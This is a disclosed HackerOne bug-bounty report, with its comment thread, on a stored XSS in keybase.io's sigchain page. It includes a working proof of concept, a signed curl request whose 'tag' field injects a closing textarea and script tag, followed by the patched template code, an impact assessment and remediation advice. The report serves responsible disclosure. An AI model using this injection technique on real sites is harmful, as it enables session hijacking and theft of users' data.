{"id":245296,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNDUyOTY=","url":"https://hackerone.com/reports/245296","title":"Persistent XSS on keybase.io via \"payload\" field in `/user/sigchain_signature.toffee` template","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2017-07-02T09:42:52.752Z","submitted_at":"2017-07-02T09:42:52.752Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"jordanmilne","url":"/jordanmilne","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/447/d7846c3a70ff69fbfa83f43531b3ca68c55545df_original.JPG/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":2809,"url":"https://hackerone.com/keybase","handle":"keybase","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/809/710eb42880bb34c06cab0d1d5081488ec59aec5e_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/809/710eb42880bb34c06cab0d1d5081488ec59aec5e_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Keybase","twitter_handle":"keybaseio","website":"https://keybase.io","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2019-03-14T15:15:33.139Z","bug_reporter_agreed_on_going_public_at":"2017-08-20T03:34:45.248Z","team_member_agreed_on_going_public_at":"2019-03-14T15:15:33.017Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Issue\n\nKeybase allows you to see other users' sigchains by navigating to \u003chttps://keybase.io/\u003cusername\\\u003e/sigchain\u003e. The \"Payload\" field containing JSON related to the chainlink on the right side of the page is not correctly escaped during templating, leading to a persistent XSS as users have a high degree of control over the contents of that field.\n\nSpecifically, the `/user/sigchain_signature.toffee` template's compiled code contains:\n\n```js\n// ...\n                _to('      \u003ctextarea wrap=\"off\" class=\"form-control fixed full-payload autoselect\" rows=\"20\" autocapitalize=\"off\" autocorrect=\"off\" autocomplete=\"off\" spellcheck=\"false\" readonly\u003e');\n                _to(\"\" + JSON.stringify(JSON.parse(sig.payload_json), null, 2)); // \u003c `payload_json` is user-controlled and not escaped!\n                _to(\"\u003c/textarea\u003e\\n\");\n// ...\n```\n\nwhere normally there would be an `escape()` around the data being interpolated in to prevent special characters being interpreted as HTML.\n\n## Proof-of-Concept\n\n* Create a new account on https://keybase.io or remove all keys / associations from an existing account\n* Generate a GPG keypair locally and upload the public half via https://keybase.io. Make sure you import these into your GPG keychain.\n* When the site asks you to upload the private half, select \"maybe another time\", then select the option to sign the pubkey with \"command line with [bash + GPG + cURL]\"\n* keybase.io will spit out a few lines of bash to paste into your terminal, copy this to a text editor.\n* Replace `\"tag\":\"signature\"` section of the JSON payload in the cURL command with `\"tag\":\"\u003c/textarea\u003e\u003cscript\u003ealert(1)\u003c/script\u003e\"`. There's no particular reason we have to inject into the `tag` field, it was just the first field I saw that wasn't validated and was reflected in the \"payload\" field on the sigchain page.\n\nYou should have something like:\n\n```bash\ncurl \\\n  --data-urlencode sig=\"`\\\n   echo '{\"body\":{\"key\":{\"eldest_kid\":\"01015d2654042fe3df8427efd4615406c4a57cbb2bbf3c4b1711f53aace9edf037480a\",\"fingerprint\":\"b54bac1da5887ffba91411894f6b7c0c98dc7571\",\"full_hash\":\"3ef468ca735aacdc3beee8f8ac1f88c4441a01a583598871721cd390d74fa465\",\"host\":\"keybase.io\",\"key_id\":\"4f6b7c0c98dc7571\",\"kid\":\"01015d2654042fe3df8427efd4615406c4a57cbb2bbf3c4b1711f53aace9edf037480a\",\"uid\":\"81d7b93a686f9bc7ff566eeb87bc8719\",\"username\":\"largenotesting\"},\"type\":\"eldest\",\"version\":1},\"ctime\":1498970799,\"expire_in\":157680000,\"prev\":\"d87dd6918ff960578d29d8c9fd47cfdd8256bc46ed288ff7475522574134a1a0\",\"seqno\":19,\"tag\":\"\u003c/textarea\u003e\u003cscript\u003ealert(1)\u003c/script\u003e\"}' | \\\n   gpg -u 'b54bac1da5887ffba91411894f6b7c0c98dc7571' -a --sign`\" \\\n  --data-urlencode type=\"eldest\" \\\n  --data-urlencode session=\"\u003cSESSION KEY\u003e\" \\\n  --data-urlencode csrf_token=\"\u003cCSRF TOKEN\u003e\" \\\n  --data-urlencode plain_out=\"1\" \\\n  --data-urlencode signing_kid=\"01015d2654042fe3df8427efd4615406c4a57cbb2bbf3c4b1711f53aace9edf037480a\" \\\n  --data-urlencode public_key=\"-----BEGIN PGP PUBLIC KEY BLOCK-----\nVersion: GnuPG v2\n\nmQENBFlYeiwBCADMIXo7d47rJpWwBVqr/obUBb0NpTh7cPnhSeoYPaIRVCPOm6ep\nHVOveqSheiIAJMVu+7sv70t67TTfszCp5lPCpgoGcotb74Eze7aF5DnoBY/kjGUt\n1PwoiMvoTgmoXikWmPd24qb2+2kRRyCSsq93Dd8/Vk1DAcDxzRbvxlLCsFGWfNmr\nRmPYB31U8OuPp7n9+FqEAWXVxFl/5AswpfRhekwG1ujlRzv4Ufpnb1PGVTdhwI0j\n/+Mk+7gK5MqcbGUT/W2O0M01onWN0Xg8pDBliR2D2ePpI08GxV0BnBYhCWgYI683\nRWrgTuSaHNdS3TqwULehYKNSqB3U2OTsdL9ZABEBAAG0KXNvbWV0aGluZyA8YW5v\ndGhlcmtleWJhQHNheW5vdG9saW51eC5jb20+iQE3BBMBCAAhBQJZWHosAhsDBQsJ\nCAcCBhUICQoLAgQWAgMBAh4BAheAAAoJEE9rfAyY3HVxgLcH/RdkDjwgLwmIiOzh\nJY/EzcVApSqMWLEO7JQZCHUgJNq/h7HY6uHd12uEAirP+QRpDIE1h98YSeIxQLAR\niWrmST/tR9PhmeUN1pYJfuPEW8PLDkefrKde+0XhvWoOzTvQNiYFGlCnP9BIiJky\nGzC0Tb7Dg8iVe032QjYCbqNyQkWmQ9ztM+j+mPHKTfMC1hzU+lOt4nexWlTSf/z6\n4GURt131gIVBuQu7pm61QZP/u+dPdazho1ikmASNHHYkAnJFzMWQ7GDi7Lqns/mB\nW7XFEqbT4dOSeEOVkckiPNDcVFgdhPiDTm4VWzQAsYU/Zr3AhcxuBSQT6l11fvWb\nEmuWeFa5AQ0EWVh6LAEIAMOJF/a1Tz7Nwa5+FhpbBX0svIzpPCfREdDg0kO0cKWU\n81IWZZrDHqmlfxCnqPyB7XfrwFb40gIbBmi6mrZb5COo5pDQ7uE+cWn5cmpVVOqx\nkEjX8jEd0SzO5kBFevlVHlGrcO23tm2FuKZBHf69u2U15ivYijceJFnRCCyW0RFQ\nCz9Rz9XBkth6x3SswBZQAT2qAaBnVwQv/YzleBH2cCUSxMkjLE8zjkFL8W+zEVGw\n9NyWQHJ/TmaHeAojvRisJ1MyIpRLhFDn8h5PYuvZs8XRK7pen+PznIAtuYYfENCR\n7tPqAp4yFkKhOBy7zQB9PUOoaZWxRwUs4HoDIkNSnWcAEQEAAYkBHwQYAQgACQUC\nWVh6LAIbDAAKCRBPa3wMmNx1ceKnB/905aQn5eJDo7Dva0AjDjYL6+mSf1eeMElF\nUUhqR3/ZVUrla5xX3N1wvnC5YfBAjXY4WpRtDFfNR35EA31kP8biAWs1bgaPybyr\nJZqHD7DQS+tccHKQd/ovNg5qFIh8KKv1pMI66n1GtG4C6btz8cbxhUj1WYfBbxdR\negSWT5WEP+lm3+iSGg4C/yPOpvqdx7ORCLvje8v9lQ8XMOPwclvYsZKuydi4anT0\nsy7LbithYRusQrkO40qiTgsD6YHGZiN++SscMg04RYgRz/F37hYeWhZqwsnq4mt3\nlzONWNX5pQsSbP0dAiJvh8otImITQFUUnfu5z+jJCXdze9/2FV8z\n=1hmO\n-----END PGP PUBLIC KEY BLOCK-----\" \\\n  --data-urlencode is_primary=\"true\" \\\n  --data-urlencode sig_required=\"true\" \\\n  https://keybase.io/_/api/1.0/key/add.json\n```\n* Run the command, then go to \u003chttps://keybase.io/\u003cYOUR_USERNAME\\\u003e/sigchain\u003e. You should see an `alert()` box pop.\n\nI can also make a profile that repros this issue if you like, I've cleared my profile since verifying this was an issue.\n\n## Impact\n\nIt seems like _most_ sensitive functionality on keybase.io is behind a password re-entry wall, so if the victim didn't have a password manager that would autopopulate password fields on https://keybase.io the attacker would have to dump a fake login prompt into the DOM to be able to do anything \"interesting\". I suppose an attacker would at least be able to pull down the user's TripleSec-encrypted privkey bundles to perform an offline attack without any special user interaction.\n\nHowever, the frontend JS references some admin-only API endpoints (viewing crashlogs, billing stuff, etc) that don't seem to require password re-auth. An XSS in the context of an admin user's session would probably allow an attacker to abuse those endpoints.\n\n## Remediation\n\nThe \"payload\" JSON should be escaped in the template like anything else in a text node. More generally, more of web frontend code should be switched to modern HTML templating techniques. There's a number of suspect instances of semi-user-controlled data being passed into HTML sinks like `$.html()`, `$.append()`, `$.prepend()`, etc.\n\nThe web frontend would also be a good candidate for CSP with nonces, since it doesn't seem to pull in third-party resources other than statics from S3, and that would have mitigated this XSS in most modern browsers.\n\nJust let me know if you need any more details! Also, hi @chromakode!","bounty_amount":"3000.0","formatted_bounty":"$3,000","weakness":{"id":62,"name":"Cross-site Scripting (XSS) - Stored"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":265,"voters":["notpwnguy","mirchr","danielmgm","jordanmilne","fersingb","spaceraccoon","michiel","base_64","0xbeefed","sameerphad72","and 255 more..."],"severity":{"rating":"high","score":8.3,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"required","scope":"unchanged","confidentiality":"high","integrity":"high","availability":"low"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1797892,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"hey Jordan - thanks for this. I confirmed it's an error and a good one at that.  I just released a quick patch that I believe fixes it. Can you confirmed it's fixed for you? ","automated_response":false,"created_at":"2017-07-02T19:02:34.124Z","updated_at":"2017-07-02T19:02:34.124Z","actor":{"url":"/keybase","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/809/710eb42880bb34c06cab0d1d5081488ec59aec5e_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Keybase"}},"bounty_amount":"1500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"keybase","collaborator":{"username":"jordanmilne","url":"/jordanmilne"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1798116,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"```js\n                reformatted = JSON.stringify(JSON.parse(sig.payload_json), null, 2);\n                // ...\n                _to('      \u003ctextarea wrap=\"off\" class=\"form-control fixed full-payload autoselect\" rows=\"20\" autocapitalize=\"off\" autocorrect=\"off\" autocomplete=\"off\" spellcheck=\"false\" readonly\u003e');\n                _to(\"\" + (reformatted != null ? escape(reformatted) : \"\"));\n                _to(\"\u003c/textarea\u003e\\n\");\n```\n\nYep, this looks correct and [the bug no longer repros](https://keybase.io/largenotesting/sigchain#8c8eec6dc19890f759ad2461514794c2f61b856937636d277c88106f1f842b430f). \n\nThe hotfix confused me at first, but I'm guessing this has to do with [Toffee bypassing autoescaping if the interpolated expression starts with `JSON.stringify`](https://github.com/malgorithms/toffee/blob/5fd1722a1dbbdf3c42ed18b505c186888bfef390/src/view.coffee#L360), and the fix would be to wrap it in `__toffee.json`'s escaping logic?","automated_response":false,"created_at":"2017-07-03T00:28:11.202Z","updated_at":"2017-07-03T00:29:13.829Z","actor":{"username":"jordanmilne","cleared":false,"url":"/jordanmilne","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/447/d7846c3a70ff69fbfa83f43531b3ca68c55545df_original.JPG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1802848,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"excellent - yeah, exactly re: the JSON.stringify being whitgelisted to bypass the standard toffee escaping. I might disable that feature since I misused it here and I'm not sure if it's in active use by anyone, really. anyway, thanks!","automated_response":false,"created_at":"2017-07-05T00:06:30.983Z","updated_at":"2017-07-05T00:06:30.983Z","actor":{"username":"chriscoyne","cleared":false,"url":"/chriscoyne","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1822817,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"hey jordanmilne - you're MVP.  Attaching an extra $1500 to this because a similar bug allowed you to get an alert into an admin-only interface. (the one with the image HTML embedded into the email address)...funny, I was about to catch it thanks to this ticket leading me to review similar calls, and when I went to the admin interface, I was faced with an alert(1)! anyway, big thanks!\n","automated_response":false,"created_at":"2017-07-10T18:56:09.539Z","updated_at":"2017-07-10T18:56:09.539Z","actor":{"url":"/keybase","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/809/710eb42880bb34c06cab0d1d5081488ec59aec5e_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Keybase"}},"bounty_amount":"1500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"keybase","collaborator":{"username":"jordanmilne","url":"/jordanmilne"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1823368,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks Chris!\n\nI'm sure you've noticed by now, but there are a number of other output sanitization issues in the admin UI. I saw that the hotfix involved manually escaping the affected fields before concatenation, but you should consider moving to something safer for ad-hoc HTML templating. IMO manual HTML templating using string concatenation is a code smell and it leads to lots of subtle vulnerabilities like these.\n\nSearching for `\\.((append|prepend|html)\\(|innerHTML\\s*=).*['\"].*\\+` in the compiled JS should bring up a few other problem areas, at least one of which can be abused to achieve reflected DOM-Based XSS (the `window.location.href` one.)\n\nIn projects that I maintain I like to use something like Django's [`format_html`](https://docs.djangoproject.com/en/1.11/ref/utils/#django.utils.html.format_html) for ad-hoc HTML templating since it will escape all input by default. For ES6 I usually use [a string interpolation helper that has opt-out escaping](https://gist.github.com/JordanMilne/f92252a29ba0ccf0830b1203c301dd46). It should work in CoffeeScript as well, but I think the IcedCoffeeScript fork is too old  so you may have to use an API more like `format_html`. I personally prefer the ES6 format string helpers because it's pretty trivial to convert to from existing code that uses string concatenation for HTML templating.\n\nFun fact though, that [email address is actually valid](http://code.iamcal.com/php/rfc822/demo.php?e=%22%3Cimg%2Fsrc%3D%27%2F%2Fsaynotolinux.com%2Ffoo%27onerror%3D%27console.log%281%29%27%3E%22%40saynotolinux.com) per the RFCs, but pretty much no MTA in production will accept it. So few people comply with the spec that simple regex-based validation is usually *less* wrong than a fully spec-compliant email validation function.\n\nJust let me know if you'd like more details!\n\\- Jordan","automated_response":false,"created_at":"2017-07-10T22:49:44.493Z","updated_at":"2017-07-10T22:49:44.493Z","actor":{"username":"jordanmilne","cleared":false,"url":"/jordanmilne","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/447/d7846c3a70ff69fbfa83f43531b3ca68c55545df_original.JPG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1886622,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi Folks,\n\nLooks like both issues I pointed out have been mitigated, should this be marked as resolved or is there some other action being taken?\n\nCheers,\n\\-Jordan","automated_response":false,"created_at":"2017-08-02T23:16:37.050Z","updated_at":"2017-08-02T23:16:37.050Z","actor":{"username":"jordanmilne","cleared":false,"url":"/jordanmilne","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/447/d7846c3a70ff69fbfa83f43531b3ca68c55545df_original.JPG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1889814,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2017-08-03T16:01:50.034Z","updated_at":"2017-08-03T16:01:50.034Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"jordanmilne","url":"/jordanmilne"},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1941310,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-08-20T03:34:45.270Z","updated_at":"2017-08-20T03:34:45.270Z","first_to_agree":true,"actor":{"username":"jordanmilne","cleared":false,"url":"/jordanmilne","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/447/d7846c3a70ff69fbfa83f43531b3ca68c55545df_original.JPG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4319285,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi folks! Would it be fine to disclose this?","automated_response":false,"created_at":"2019-03-13T21:14:56.254Z","updated_at":"2019-03-13T21:14:56.254Z","actor":{"username":"jordanmilne","cleared":false,"url":"/jordanmilne","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/447/d7846c3a70ff69fbfa83f43531b3ca68c55545df_original.JPG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4323386,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-03-14T15:15:33.053Z","updated_at":"2019-03-14T15:15:33.053Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4323387,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2019-03-14T15:15:33.162Z","updated_at":"2019-03-14T15:15:33.162Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}